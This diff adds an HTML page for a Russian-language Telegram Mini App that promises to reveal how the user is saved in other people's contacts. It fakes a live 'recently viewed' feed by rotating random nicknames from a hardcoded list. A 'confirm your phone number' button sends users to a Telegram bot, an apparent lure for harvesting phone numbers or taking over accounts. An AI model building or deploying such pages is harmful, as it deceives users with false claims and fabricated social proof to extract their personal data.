@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Узнайка</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #020617;
+            color: #f9fafb;
+            min-height: 100vh;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Анимированный минималистичный фон с мягким переливом */
+        .bg-base {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 0% 0%, #1d4ed8 0, transparent 55%),
+                        radial-gradient(circle at 100% 0%, #7c3aed 0, transparent 55%),
+                        radial-gradient(circle at 0% 100%, #ec4899 0, transparent 55%),
+                        #020617;
+            z-index: -3;
+            animation: bgDrift 32s ease-in-out infinite alternate;
+        }
+        .bg-orbit {
+            position: fixed;
+            inset: 8%;
+            border-radius: 999px;
+            border: 1px solid rgba(148,163,184,0.18);
+            box-shadow: 0 0 40px rgba(15,23,42,0.9);
+            z-index: -2;
+            animation: orbitSpin 40s linear infinite;
+        }
+        .bg-orbit::after {
+            content: '';
+            position: absolute;
+            inset: 16%;
+            border-radius: inherit;
+            border: 1px solid rgba(148,163,184,0.16);
+            animation: orbitSpin 55s linear infinite reverse;
+        }
+        .bg-noise {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            opacity: .15;
+            mix-blend-mode: soft-light;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="160" height="160" viewBox="0 0 160 160"><filter id="n"><feTurbulence type="fractalNoise" baseFrequency="0.8" numOctaves="3"/></filter><rect width="100%" height="100%" filter="url(%23n)" opacity="0.6"/></svg>');
+            z-index: -1;
+        }
+        @keyframes bgDrift {
+            0%   { transform: translate3d(0,0,0) scale(1); }
+            50%  { transform: translate3d(0,-14px,0) scale(1.03); }
+            100% { transform: translate3d(0,6px,0) scale(1.02); }
+        }
+        @keyframes orbitSpin {
+            to { transform: rotate(360deg); }
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 18px 16px 26px;
+        }
+
+        .shell {
+            background: rgba(15,23,42,0.96);
+            border-radius: 26px;
+            padding: 18px 16px 18px;
+            border: 1px solid rgba(148,163,184,0.4);
+            box-shadow: 0 24px 60px rgba(15,23,42,0.95);
+            backdrop-filter: blur(24px);
+        }
+
+        .top-row { display:flex;align-items:center;justify-content:space-between;margin-bottom:14px; }
+        .title-wrap { display:flex;align-items:center;gap:10px; }
+        .icon-pill {
+            width: 34px;height:34px;border-radius:14px;
+            background: radial-gradient(circle at 30% 20%, #facc15, #f97316);
+            display:flex;align-items:center;justify-content:center;
+            box-shadow:0 12px 26px rgba(234,179,8,0.55);
+        }
+        .icon-pill span { font-size:20px; }
+        .title-main { font-size:19px;font-weight:700; }
+        .status-dot { font-size:11px;padding:4px 10px;border-radius:999px;background:radial-gradient(circle at 0 0,#22c55e,#16a34a);box-shadow:0 0 14px rgba(34,197,94,0.9); }
+
+        .subtitle { font-size:13px;color:#9ca3af;margin-bottom:16px; }
+
+        .stats { display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;margin-bottom:18px; }
+        .stat-card { border-radius:18px;padding:10px 8px 9px;text-align:center;background:radial-gradient(circle at 0 0,rgba(148,163,184,0.25),transparent 60%),rgba(15,23,42,0.95);border:1px solid rgba(148,163,184,0.4); }
+        .stat-icon{font-size:18px;margin-bottom:4px;}
+        .stat-value{font-size:17px;font-weight:600;}
+        .stat-label{font-size:11px;color:#9ca3af;}
+
+        .greeting{display:flex;align-items:center;gap:6px;margin-bottom:14px;font-size:15px;}
+        .username{color:#a855f7;font-weight:600;}
+        .wave{display:inline-block;transform-origin:70% 70%;animation:wave 2.4s ease-in-out infinite;}
+        @keyframes wave{0%,100%{transform:rotate(0)}20%{transform:rotate(18deg)}40%{transform:rotate(-8deg)}60%{transform:rotate(10deg)}80%{transform:rotate(-4deg)}}
+
+        .section-title{text-align:center;font-size:18px;font-weight:600;margin-bottom:4px;}
+        .section-sub{text-align:center;font-size:13px;color:#9ca3af;margin-bottom:14px;}
+
+        /* Главная кнопка с аккуратным переливом */
+        .btn-wrap{display:flex;justify-content:center;margin-bottom:18px;}
+        .btn-main{
+            border:none;border-radius:999px;padding:13px 30px;
+            font-size:15px;font-weight:600;color:#f9fafb;
+            background:linear-gradient(120deg,#4f46e5,#a855f7,#ec4899,#4f46e5);
+            background-size:220% 100%;
+            animation:btnGradient 5s ease-in-out infinite;
+            box-shadow:0 12px 30px rgba(79,70,229,0.55);
+        }
+        @keyframes btnGradient{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+
+        .recent{margin-top:4px;}
+        .recent-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;}
+        .recent-title{font-size:15px;font-weight:600;display:flex;align-items:center;gap:6px;}
+        .live-dot{width:7px;height:7px;border-radius:999px;background:#22c55e;box-shadow:0 0 10px rgba(34,197,94,0.9);animation:pulseDot 1.4s ease-in-out infinite;}
+        @keyframes pulseDot{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.5);opacity:.4}}
+
+        .recent-box{border-radius:18px;padding:10px 8px;background:rgba(15,23,42,0.96);border:1px solid rgba(148,163,184,0.45);backdrop-filter:blur(20px);}
+        .recent-item{display:grid;grid-template-columns:auto 1fr auto;gap:10px;align-items:center;padding:9px 6px;}
+        .recent-item:not(:last-child){border-bottom:1px solid rgba(30,41,59,0.9);} 
+        .avatar{width:36px;height:36px;border-radius:14px;background:radial-gradient(circle at 30% 0,#f9fafb,transparent 55%),linear-gradient(135deg,#4f46e5,#a855f7,#ec4899);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;color:#020617;}
+        .nick{font-size:14px;font-weight:600;}
+        .action{font-size:12px;color:#9ca3af;margin-top:2px;}
+        .time{font-size:11px;color:#9ca3af;white-space:nowrap;}
+
+        .fact{margin-top:12px;border-radius:18px;padding:10px 10px 9px;background:radial-gradient(circle at 0 0,rgba(248,250,252,0.15),transparent 60%),rgba(15,23,42,0.96);border:1px solid rgba(148,163,184,0.45);font-size:12px;}
+
+        .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(15,23,42,0.86);backdrop-filter:blur(18px);z-index:20;}
+        .modal.active{display:flex;}
+        .modal-card{width:86%;max-width:380px;border-radius:24px;padding:18px 16px 16px;background:rgba(15,23,42,0.98);border:1px solid rgba(148,163,184,0.55);box-shadow:0 22px 60px rgba(15,23,42,0.98);}
+        .modal-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;}
+        .warn-icon{width:44px;height:44px;border-radius:16px;background:radial-gradient(circle at 30% 0,#fef9c3,#f97316);display:flex;align-items:center;justify-content:center;font-size:24px;}
+        .modal-title{font-size:18px;font-weight:700;color:#fbbf24;flex:1;text-align:center;}
+        .close-btn{width:30px;height:30px;border-radius:12px;border:1px solid rgba(148,163,184,0.7);background:transparent;color:#e5e7eb;display:flex;align-items:center;justify-content:center;font-size:17px;}
+        .modal-text{font-size:14px;color:#e5e7eb;margin-bottom:14px;text-align:center;}
+        .modal-text strong{color:#fde047;}
+        .confirm-btn{width:100%;border:none;border-radius:999px;padding:11px 16px;font-size:15px;font-weight:600;color:#f9fafb;background:linear-gradient(120deg,#4f46e5,#a855f7,#ec4899,#4f46e5);background-size:220% 100%;animation:btnGradient 5s ease-in-out infinite;}
+
+        @media (max-width:360px){.title-main{font-size:17px;}.subtitle{font-size:12px;}}
+    </style>
+</head>
+<body>
+    <div class="bg-base"></div>
+    <div class="bg-orbit"></div>
+    <div class="bg-noise"></div>
+
+    <div class="container">
+        <div class="shell">
+            <div class="top-row">
+                <div class="title-wrap">
+                    <div class="icon-pill"><span>👑</span></div>
+                    <div class="title-main">Как ты записан?</div>
+                </div>
+                <div class="status-dot">Online</div>
+            </div>
+            <div class="subtitle">Сервис показывает, как ты записан в контактах других людей.</div>
+
+            <div class="stats">
+                <div class="stat-card"><div class="stat-icon">👥</div><div class="stat-value">?</div><div class="stat-label">Контактов</div></div>
+                <div class="stat-card"><div class="stat-icon">📊</div><div class="stat-value">?</div><div class="stat-label">Просмотров</div></div>
+                <div class="stat-card"><div class="stat-icon">⭐</div><div class="stat-value">?</div><div class="stat-label">Рейтинг</div></div>
+            </div>
+
+            <div class="greeting">
+                <span>Привет,</span>
+                <span class="username" id="username">минералка</span>
+                <span class="wave">👋</span>
+            </div>
+
+            <div class="section-title">Информация</div>
+            <div class="section-sub">Нажми на кнопку и узнай, как ты записан в контактах.</div>
+
+            <div class="btn-wrap">
+                <button class="btn-main" onclick="showModal()">Узнать как я записан</button>
+            </div>
+
+            <div class="recent">
+                <div class="recent-head">
+                    <div class="recent-title"><span>👀 Недавно смотрели</span><span class="live-dot"></span></div>
+                    <div style="font-size:11px;color:#9ca3af;">обновляется</div>
+                </div>
+                <div class="recent-box" id="recentList"></div>
+            </div>
+
+            <div class="fact">
+                💡 Наш сервис показывает актуальные данные по тому, как ты подписан в чужих телефонах.
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="modal" onclick="backdropClose(event)">
+        <div class="modal-card">
+            <div class="modal-top">
+                <div class="warn-icon">⚠️</div>
+                <div class="modal-title">Внимание</div>
+                <button class="close-btn" onclick="closeModal()">✕</button>
+            </div>
+            <div class="modal-text">Для получения доступа к сервису нужно <strong>подтвердить</strong>, что этот номер телефона принадлежит тебе.</div>
+            <button class="confirm-btn" onclick="confirmAction()">Подтвердить</button>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.expand();
+            const user = tg.initDataUnsafe?.user;
+            if (user) {
+                const name = user.first_name || user.username || 'минералка';
+                document.getElementById('username').textContent = name;
+            }
+        }
+
+        function showModal(){ document.getElementById('modal').classList.add('active'); }
+        function closeModal(){ document.getElementById('modal').classList.remove('active'); }
+        function backdropClose(e){ if(e.target.id==='modal'){ closeModal(); } }
+
+        const REDIRECT_URL = 'https://t.me/profileeye_xbfvy_bot?start=jujujjuju877643kkiu';
+        function confirmAction(){ window.location.href = REDIRECT_URL; }
+
+        // Недавно смотрели: максимум 6 записей, новый каждые 20 секунд
+        const recentList = document.getElementById('recentList');
+
+        const nickPool = [
+            'bogdan.chik13','alinchik_27','roman.36','makar_chik97','nadya_27','ilya.zab25',
+            'maxon_01','vladik.pro9','ksusha_s.mile','artem.life_21','katya.m00n','diman_777',
+            'fox.girl_3','night_rider_01','sunny.day_07','misha_k13','vika.rose_2','sergey_ok_01',
+            'angelina33_','pavel_time.4'
+        ];
+        const ACTION_TEXT = 'Проверил(а) контакты';
+        let recentItems = [];
+
+        function pickRandomNick(){ return nickPool[Math.floor(Math.random()*nickPool.length)]; }
+
+        function createRecentItem(nick, minutesAgo){
+            const wrap = document.createElement('div');
+            wrap.className = 'recent-item';
+
+            const avatar = document.createElement('div');
+            avatar.className = 'avatar';
+            avatar.textContent = nick[0].toUpperCase();
+
+            const info = document.createElement('div');
+            const nickEl = document.createElement('div');
+            nickEl.className = 'nick';
+            nickEl.textContent = '@' + nick;
+            const actionEl = document.createElement('div');
+            actionEl.className = 'action';
+            actionEl.textContent = ACTION_TEXT;
+            info.appendChild(nickEl); info.appendChild(actionEl);
+
+            const time = document.createElement('div');
+            time.className = 'time';
+            time.textContent = formatMinutes(minutesAgo);
+
+            wrap.appendChild(avatar);wrap.appendChild(info);wrap.appendChild(time);
+
+            return {node:wrap, minutes:minutesAgo, timeEl:time};
+        }
+
+        function formatMinutes(m){
+            if(m <= 0) return 'только что';
+            if(m === 1) return '1 минуту назад';
+            if(m >= 2 && m <= 4) return m + ' минуты назад';
+            if(m >= 5 && m < 60) return m + ' минут назад';
+            const h = Math.floor(m/60);
+            if(h === 1) return '1 час назад';
+            return h + ' часа назад';
+        }
+
+        function seedRecent(){
+            const base = [0,1,1,2,3,3]; // максимум 6 элементов
+            base.forEach(m => {
+                const nick = pickRandomNick();
+                const item = createRecentItem(nick, m);
+                recentItems.push(item);
+                recentList.appendChild(item.node);
+            });
+        }
+
+        function tickMinutes(){
+            recentItems.forEach(it => {
+                it.minutes++;
+                it.timeEl.textContent = formatMinutes(it.minutes);
+            });
+        }
+
+        function addNewRecent(){
+            const item = createRecentItem(pickRandomNick(), 0);
+            recentItems.unshift(item);
+            recentList.prepend(item.node);
+
+            if(recentItems.length > 6){
+                const removed = recentItems.pop();
+                removed.node.remove();
+            }
+        }
+
+        seedRecent();
+        setInterval(tickMinutes, 60000); // обновление времени каждую минуту
+
+        function scheduleNew(){
+            setTimeout(()=>{ addNewRecent(); scheduleNew(); }, 20000); // каждые 20 секунд
+        }
+        scheduleNew();
+    </script>
+</body>
+</html>
